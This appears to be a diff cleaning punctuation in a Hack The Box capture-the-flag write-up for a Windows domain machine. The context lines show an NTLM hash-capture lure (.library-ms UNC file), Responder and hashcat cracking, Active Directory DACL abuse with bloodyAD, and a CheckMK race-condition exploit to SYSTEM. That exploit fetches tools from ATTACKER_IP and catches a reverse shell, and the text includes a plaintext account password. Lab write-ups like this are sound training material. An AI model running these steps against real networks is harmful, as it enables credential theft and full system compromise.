@@ -54,25 +54,25 @@ nc -nv 10.129.243.199 6556 > check_mk_dump.txt
 Key findings from the unauthenticated data dump:
 
 - **Version:** CheckMK 2.1.0p10 (vulnerable to CVE-2024-0670)
-- **web_svc** is running `httpd.exe` (Apache/XAMPP) — target for initial foothold
-- **web_svc** is also running `explorer.exe` and `rdpclip.exe` — indicates interactive RDP session, suggesting a human-memorable (crackable) password
+- **web_svc** is running `httpd.exe` (Apache/XAMPP) target for initial foothold
+- **web_svc** is also running `explorer.exe` and `rdpclip.exe` indicates interactive RDP session, suggesting a human-memorable (crackable) password
 - Agent directories: `C:\ProgramData\checkmk\agent\plugins`, `local`, `spool`
 
 ---
 
-## Initial Foothold — NTLMv2 Hash Capture (CVE-2025-24071)
+## Initial Foothold NTLMv2 Hash Capture (CVE-2025-24071)
 
 ### Vulnerability Analysis
 
 A `.library-ms` file is an XML-based Windows Library descriptor. Its `<simpleLocation><url>` tag accepts UNC paths (`\\attacker-ip\share`). When WinRAR extracts a ZIP containing this file, the Windows shell automatically resolves the UNC path, triggering an outbound SMB authentication attempt — leaking the running user's NTLMv2 hash.
 
-### Step 1 — Start Responder
+### Step 1 Start Responder
 
 ```bash
 sudo responder -I tun0 -v
 ```
 
-### Step 2 — Craft the Malicious .library-ms File
+### Step 2 Craft the Malicious .library-ms File
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -91,7 +91,7 @@ sudo responder -I tun0 -v
 </libraryDescription>
 ```
 
-### Step 3 — Package and Upload
+### Step 3 Package and Upload
 
 ```bash
 zip exploit.zip payload.library-ms
@@ -100,7 +100,7 @@ zip exploit.zip payload.library-ms
 
 Responder captures the NTLMv2 hash for `NANOCORP\web_svc`.
 
-### Step 4 — Crack the Hash
+### Step 4 Crack the Hash
 
 ```bash
 hashcat -m 5600 web_svc_hash.txt /usr/share/wordlists/rockyou.txt
@@ -110,13 +110,13 @@ hashcat -m 5600 web_svc_hash.txt /usr/share/wordlists/rockyou.txt
 
 ---
 
-## Kerberos Time Skew — Critical Setup
+## Kerberos Time Skew Critical Setup
 
 The DC's clock is ~7 hours ahead of real time. Kerberos has a 5-minute tolerance, so all Kerberos operations fail with `KRB_AP_ERR_SKEW` without correction.
 
-> **⚠️ WARNING:** Never use `sudo ntpdate` on HTB — it permanently shifts your system clock and breaks your VPN session.
+> **⚠️ WARNING:** Never use `sudo ntpdate` on HTB it permanently shifts your system clock and breaks your VPN session.
 
-### Correct Approach — Use faketime
+### Correct Approach Use faketime
 
 ```bash
 # Install
@@ -188,9 +188,9 @@ REMOTE MANAGEMENT USERS → WinRM Access
 
 ---
 
-## Lateral Movement — DACL Abuse
+## Lateral Movement DACL Abuse
 
-### Step 1 — AddSelf to IT_SUPPORT
+### Step 1 AddSelf to IT_SUPPORT
 
 ```bash
 faketime -f "+7h" bloodyAD --host 10.129.243.199 -d nanocorp.htb \
@@ -199,7 +199,7 @@ faketime -f "+7h" bloodyAD --host 10.129.243.199 -d nanocorp.htb \
 # [+] web_svc added to IT_SUPPORT
 ```
 
-### Step 2 — ForceChangePassword on monitoring_svc
+### Step 2 ForceChangePassword on monitoring_svc
 
 ```bash
 faketime -f "+7h" bloodyAD --host 10.129.243.199 -d nanocorp.htb \
@@ -210,9 +210,9 @@ faketime -f "+7h" bloodyAD --host 10.129.243.199 -d nanocorp.htb \
 
 > **⚠️ Note on Shared Machines:** Other players can reset the password. The minimum password age policy blocks re-changes for 3 days. Work fast — change password → get TGT → connect in one shot.
 
-### Step 3 — Get TGT and WinRM Shell
+### Step 3 Get TGT and WinRM Shell
 
-`monitoring_svc` is in the **Protected Users** group — NTLM authentication is completely blocked. Kerberos ticket required.
+`monitoring_svc` is in the **Protected Users** group NTLM authentication is completely blocked. Kerberos ticket required.
 
 ```bash
 # Get TGT
@@ -233,7 +233,7 @@ type C:\Users\monitoring_svc\Desktop\user.txt
 
 ---
 
-## Privilege Escalation — CVE-2024-0670 (CheckMK Race Condition)
+## Privilege Escalation CVE-2024-0670 (CheckMK Race Condition)
 
 ### Vulnerability Analysis
 
@@ -245,19 +245,19 @@ cmk_all_<PID>_<CTR>.cmd
 
 **The exploit chain:**
 
-1. **Predictable names** — attacker pre-creates files for all possible PIDs
-2. **World-writable directory** — `C:\Windows\Temp` allows any user to create files
-3. **Read-only trap** — set pre-created files as read-only
-4. **Silent failure** — agent fails to overwrite read-only file but doesn't check return value
-5. **Execution** — agent executes attacker's payload as SYSTEM
+1. **Predictable names** - attacker pre-creates files for all possible PIDs
+2. **World-writable directory** - `C:\Windows\Temp` allows any user to create files
+3. **Read-only trap** - set pre-created files as read-only
+4. **Silent failure** - agent fails to overwrite read-only file but doesn't check return value
+5. **Execution** - agent executes attacker's payload as SYSTEM
 
 ### The Pivot Problem
 
-`monitoring_svc` cannot trigger MSI repair — gets error `1601 (ERROR_INSTALL_SERVICE_FAILURE)`. `web_svc` can trigger it, but has no persistent WinRM shell due to its account configuration.
+`monitoring_svc` cannot trigger MSI repair gets error `1601 (ERROR_INSTALL_SERVICE_FAILURE)`. `web_svc` can trigger it, but has no persistent WinRM shell due to its account configuration.
 
-**Solution: RunasCs** — execute commands as `web_svc` from within the `monitoring_svc` shell.
+**Solution: RunasCs** execute commands as `web_svc` from within the `monitoring_svc` shell.
 
-### Step 1 — Create exploit.ps1
+### Step 1 Create exploit.ps1
 
 ```powershell
 $LHOST = "YOUR_ATTACKER_IP"
@@ -284,7 +284,7 @@ Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn" -Wait
 Write-Host "[*] Done. Check listener."
 ```
 
-### Step 2 — Prepare Tools on Attacker Machine
+### Step 2 Prepare Tools on Attacker Machine
 
 ```bash
 # Download RunasCs
@@ -299,7 +299,7 @@ python3 -m http.server 8000
 rlwrap nc -lnvp 9001
 ```
 
-### Step 3 — Download Tools in monitoring_svc Shell
+### Step 3 Download Tools in monitoring_svc Shell
 
 ```powershell
 cd C:\Windows\Temp
@@ -308,7 +308,7 @@ wget http://ATTACKER_IP:8000/RunasCs.exe -UseBasicParsing -OutFile "RunasCs.exe"
 wget http://ATTACKER_IP:8000/exploit.ps1 -UseBasicParsing -OutFile "bad.ps1"
 ```
 
-### Step 4 — Execute as web_svc via RunasCs
+### Step 4 Execute as web_svc via RunasCs
 
 ```powershell
 .\RunasCs.exe web_svc "dksehdgh712!@#" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\bad.ps1"
@@ -316,7 +316,7 @@ wget http://ATTACKER_IP:8000/exploit.ps1 -UseBasicParsing -OutFile "bad.ps1"
 
 The script seeds ~30,000 read-only batch files, then triggers the MSI repair. The CheckMK agent spawns a new process, picks up the attacker's batch file, and executes it as SYSTEM.
 
-### Step 5 — Capture root.txt
+### Step 5 Capture root.txt
 
 ```cmd
 cd C:\Users\Administrator\Desktop
@@ -331,7 +331,7 @@ type root.txt
 If an account is in `Protected Users`, NTLM is completely disabled. Symptoms: `WinRMAuthorizationError` even with correct password. Solution: always use Kerberos tickets with `faketime`.
 
 ### Kerberos Auth Requirements
-- Always use FQDN (`dc01.nanocorp.htb`), never IP — SPNs are registered by hostname
+- Always use FQDN (`dc01.nanocorp.htb`), never IP SPNs are registered by hostname
 - FQDN must resolve in `/etc/hosts`
 - `KRB5CCNAME` env var must match the exact ccache filename
 - Time skew must be corrected with `faketime -f "+Xh"`
@@ -341,7 +341,7 @@ If an account is in `Protected Users`, NTLM is completely disabled. Symptoms: `W
 - Minimum password age policy blocks re-changes for 3 days after someone else changed it
 - Solution: time your attack, change → get TGT → connect immediately in a single script
 
-### RunasCs — The Key Tool
+### RunasCs The Key Tool
 When you have credentials for a user but can't get a shell (WinRM auth fails, NTLM blocked, etc.), RunasCs lets you execute commands under that user's token from any existing shell. Essential for this box.
 
 ### MSI Path
